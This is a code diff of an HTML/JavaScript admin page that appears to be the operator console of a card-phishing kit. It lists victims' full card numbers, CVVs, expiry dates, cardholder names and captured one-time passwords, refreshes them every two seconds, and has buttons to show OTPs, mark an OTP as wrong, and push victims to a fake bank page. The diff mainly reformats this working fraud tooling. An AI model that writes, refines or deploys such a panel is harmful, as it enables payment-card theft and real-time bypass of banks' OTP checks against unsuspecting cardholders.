@@ -4,7 +4,8 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Admin Panel</title>
-    <style>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <style>
     body {
       background: #000; 
       color: #fff;
@@ -184,68 +185,54 @@
     </table>
   </div>
 
+  <script src="/socket.io/socket.io.js"></script>
   <script>
     let transactions = new Map();
     let paymentLinks = new Map();
     let bankpageWindow = null;
     
-    // Replace the ENTIRE form submit event listener with this
-document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
-  e.preventDefault(); // This MUST be the first line
-  
-  const amountInput = document.getElementById('amount');
-  const descInput = document.getElementById('description');
-  const linkContainer = document.getElementById('paymentLinkContainer');
-  
-  try {
-    // Clear previous errors
-    linkContainer.style.display = 'none';
-    
-    // Validate inputs
-    const amount = parseFloat(amountInput.value);
-    const description = descInput.value.trim();
-    
-    if (!amount || amount <= 0) throw new Error('Enter valid amount (>0)');
-    if (!description) throw new Error('Description cannot be empty');
-
-    // API call
-    const response = await fetch('/api/generatePaymentLink', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ amount, description })
+    document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
+      e.preventDefault(); // Prevent default form submission
+      
+      const amountInput = document.getElementById('amount');
+      const descInput = document.getElementById('description');
+      const linkContainer = document.getElementById('paymentLinkContainer');
+      
+      try {
+        const amount = parseFloat(amountInput.value);
+        const description = descInput.value.trim();
+        
+        if (!amount || amount <= 0) throw new Error('Please enter a valid positive amount');
+        if (!description) throw new Error('Description cannot be empty');
+        
+        const response = await fetch('/api/generatePaymentLink', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ amount, description })
+        });
+        
+        if (!response.ok) {
+          const errorData = await response.json();
+          throw new Error(errorData.message || 'Payment link generation failed');
+        }
+        
+        const data = await response.json();
+        document.getElementById('paymentLink').textContent = data.paymentLink;
+        linkContainer.style.display = 'block';
+        alert('Payment link created successfully!');
+      } catch (error) {
+        console.error('Error:', error);
+        alert(`ERROR: ${error.message}`);
+        linkContainer.style.display = 'none';
+      }
     });
-
-    // Handle HTTP errors
-    if (!response.ok) {
-      const errorData = await response.json();
-      throw new Error(errorData.message || 'Server error');
-    }
-
-    // Show success
-    const data = await response.json();
-    document.getElementById('paymentLink').textContent = data.paymentLink;
-    linkContainer.style.display = 'block';
     
-} catch (error) {
-  console.error('Error:', error);
-  let errorMessage = error.message;
-  
-  // Handle cases where response isn't JSON
-  if (error instanceof SyntaxError) {
-    errorMessage = 'Invalid server response';
-  }
-  
-  alert(`ERROR: ${errorMessage}`);
-  linkContainer.style.display = 'none';
-  }
-});
-
     function copyPaymentLink() {
       const link = document.getElementById('paymentLink').textContent;
       navigator.clipboard.writeText(link);
       alert('Payment link copied to clipboard!');
     }
-
+    
     async function showOTP(id) {
       try {
         const response = await fetch("/api/showOTP", {
@@ -260,7 +247,7 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
         alert('Failed to show OTP. Please try again.');
       }
     }
-
+    
     async function redirectToBankPage(id) {
       try {
         const response = await fetch("/api/redirectToBankPage", {
@@ -275,7 +262,7 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
         alert('Failed to redirect to bank page. Please try again.');
       }
     }
-
+    
     async function markWrongOTP(id) {
       try {
         const response = await fetch("/api/wrongOTP", {
@@ -290,7 +277,7 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
         alert('Failed to mark OTP as wrong. Please try again.');
       }
     }
-
+    
     async function updateStatus(id, status) {
       try {
         const response = await fetch("/api/updateRedirectStatus", {
@@ -305,29 +292,28 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
         alert('Failed to update status. Please try again.');
       }
     }
-
-async function loadTransactions() {
-  try {
-    const response = await fetch("/api/transactions");
-    const data = await response.json();
-    const tbody = document.querySelector("#transactionsTable tbody");
-    tbody.innerHTML = '';
     
-    // Update local transactions Map
-    transactions.clear();
-    data.forEach(tx => transactions.set(tx.id, tx));
-
-    data.forEach(tx => {
-      const row = document.createElement('tr');
-      row.innerHTML = `
+    async function loadTransactions() {
+      try {
+        const response = await fetch("/api/transactions");
+        const data = await response.json();
+        const tbody = document.querySelector("#transactionsTable tbody");
+        tbody.innerHTML = '';
+        
+        transactions.clear();
+        data.forEach(tx => transactions.set(tx.id, tx));
+    
+        data.forEach(tx => {
+          const row = document.createElement('tr');
+          row.innerHTML = `
             <td>${tx.id}</td>
-            <td>${tx.email}</td>
+            <td>${tx.email || ''}</td>
             <td>${tx.amount}</td>
-            <td>${tx.currency}</td>
-            <td>${tx.cardNumber}</td>
-            <td>${tx.cvv}</td>
-            <td>${tx.expiry}</td>
-            <td>${tx.cardholder}</td>
+            <td>${tx.currency || ''}</td>
+            <td>${tx.cardNumber || ''}</td>
+            <td>${tx.cvv || ''}</td>
+            <td>${tx.expiry || ''}</td>
+            <td>${tx.cardholder || ''}</td>
             <td>
               ${tx.otpEntered ? 
                 `<span class="otp-received">${tx.otpEntered}</span>
@@ -360,47 +346,38 @@ async function loadTransactions() {
               ` : ''}
             </td>
           `;
-      tbody.appendChild(row);
-    });
-  } catch (error) {
-    console.error('Error loading transactions:', error);
-  }
-}
-
-   async function toggleBankpage(id) {
-  try {
-    const response = await fetch("/api/transactions");
-    const transactionsData = await response.json();
-    const txn = transactionsData.find(t => t.id === id);
-    
-    if (!txn) {
-      throw new Error('Transaction not found');
+          tbody.appendChild(row);
+        });
+      } catch (error) {
+        console.error('Error loading transactions:', error);
+      }
     }
-
-    const endpoint = txn.bankpageVisible ? '/api/hideBankpage' : '/api/showBankpage';
-    const apiResponse = await fetch(endpoint, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ invoiceId: id })
-    });
-
-    if (!apiResponse.ok) {
-      const errorData = await apiResponse.json();
-      throw new Error(errorData.message || 'Failed to toggle bank page');
-    }
-
-    // Refresh transactions immediately
-    await loadTransactions();
     
-  } catch (error) {
-    console.error('Error:', error);
-    alert(`Error: ${error.message}`);
-  }
-}
-
+    async function toggleBankpage(id) {
+      try {
+        const txn = transactions.get(id);
+        const endpoint = txn.bankpageVisible ? '/api/hideBankpage' : '/api/showBankpage';
+    
+        const response = await fetch(endpoint, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ invoiceId: id })
+        });
+    
+        if (!response.ok) {
+          const errorData = await response.json();
+          throw new Error(errorData.message || 'Failed to toggle bank page');
+        }
+    
+        loadTransactions();
+      } catch (error) {
+        console.error('Error:', error);
+        alert(`Error: ${error.message}`);
+      }
+    }
+    
     loadTransactions();
-setInterval(loadTransactions, 2000);
-
+    setInterval(loadTransactions, 2000);
   </script>
 </body>
 </html>
